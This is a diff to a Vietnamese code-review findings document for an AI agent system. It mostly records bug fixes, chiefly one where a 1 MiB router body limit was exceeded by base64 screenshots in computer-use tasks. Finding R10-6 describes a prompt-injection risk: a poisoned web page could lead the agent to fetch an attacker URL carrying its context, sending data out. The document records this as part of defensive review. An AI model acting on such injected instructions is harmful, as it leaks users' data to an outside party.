@@ -194,3 +194,18 @@ COMMENTS**, điểm rủi ro **3/10** — ba phát hiện mức TB, ba mức Th�
 | R10-6 | Ghi chú | `web_fetch` là kênh GET ra ngoài do cả `orchestrator` lẫn `research` giữ: một trang bị tiêm nhiễm có thể xúi agent tải `https://ke-tan-cong/?<ngữ cảnh>` — chiều **rò ra**, khác chiều nội dung bẩn vào | ĐÃ GHI NHẬN — thêm dòng "Rủi ro còn lại: kênh ra" vào `docs/research/host-web-tools.md` §3 kèm cách siết (bỏ `web_*` khỏi vai gốc, hoặc danh sách đích cho phép). Chưa đổi quyền vì chủ sở hữu đã chốt phương án này | `docs/research/host-web-tools.md` §3 |
 | R10-7 | Nit | `worker.py` xác nhận con trỏ tới nơi bằng `f'X={x}' in out`, nên đích `(64, 3)` gặp con trỏ thật ở `(640, 300)` là "tới nơi" ngay | ĐÃ SỬA — so khớp theo dòng `X=<số>`/`Y=<số>` | `test_sandbox_worker_pointer.py::test_a_prefix_of_the_real_coordinates_does_not_count_as_arrival` (mới) |
 | R10-8 | Nit | `scripts/eval/README.md` §2 ghi "Thêm **hai** biến kết nối" nhưng liệt kê bốn tên | ĐÃ SỬA — sửa thành "bốn biến" | `scripts/eval/README.md` §2 |
+
+### 6.7 F-1 — trần 1 MiB của router làm chết nhiệm vụ CUA nặng — ĐÃ SỬA (đợt này)
+
+Nguồn: vòng kiểm chứng độc lập đợt 10, ca T21 (nhiệm vụ nặng để mô hình tự chọn chụp màn hình
+giữa các bước). Đây là lỗi **có sẵn**, không nằm trong diff của vòng 10 — nhưng nó chặn đúng
+hạng mục "CUA nhẹ → nặng" mà chủ sở hữu yêu cầu, nên được sửa luôn.
+
+| Mã | Mức | Nội dung | Trạng thái | Bằng chứng |
+|---|---|---|---|---|
+| F-1 | Cao (chặn nhiệm vụ dài) | Router từ chối thân request trên **1 MiB** (`router/src/server.mjs:27`), mà mỗi lần chụp màn hình được nhét vào thân dưới dạng base64 và `ContextCompressor` chỉ đếm **token** nên không bao giờ thấy trần byte. Đo được: thân request 1 107 315 ký tự, trong đó **1 018 908 ký tự là ảnh base64** (mỗi ảnh 77–104 KB); mọi lượt gọi sau đó chết với `UPSTREAM_HTTP_413: Request is too large.` — tái hiện 3 lần (một phiên chết ở bước 11, một phiên mới chết sau 4 ảnh) | ĐÃ SỬA — `runtime.bound_inline_media()` giữ ảnh của **2 lần chụp mới nhất** và tổng tối đa **512 KB** trong thân request; ảnh cũ rút về phần chữ đi kèm (vẫn còn đường dẫn tệp). Bản lưu trong store không đổi, nên giao diện chat vẫn thấy mọi ảnh. Áp tại `RouterClient.complete()` — nơi duy nhất dựng thân request — và ghi `model.media_pruned` khi có ảnh bị rút | `test_inline_media_bound.py` (6 ca): không ảnh thì trả nguyên danh sách; 5 ảnh → chỉ 2 ảnh cuối còn inline, phần chữ giữ đường dẫn; danh sách gốc không bị sửa; trần byte thắng trần số lượng; 12 ảnh 90 KB: thân trước 1 107 315 B > 1 MiB, sau khi rút < 1 MiB |
+
+Ghi chú kèm theo (không sửa trong đợt này): `RouterClient` vẫn gắn cứng `http://127.0.0.1:3101`
+(không có biến môi trường), và trần 1 MiB của router cũng không cấu hình được — vòng kiểm chứng
+phải dựng một bản router sao 128 MiB ở cổng khác để chứng minh rằng đổi trần **một mình** không
+giải quyết được gì, vì đường gọi không đi qua đó.
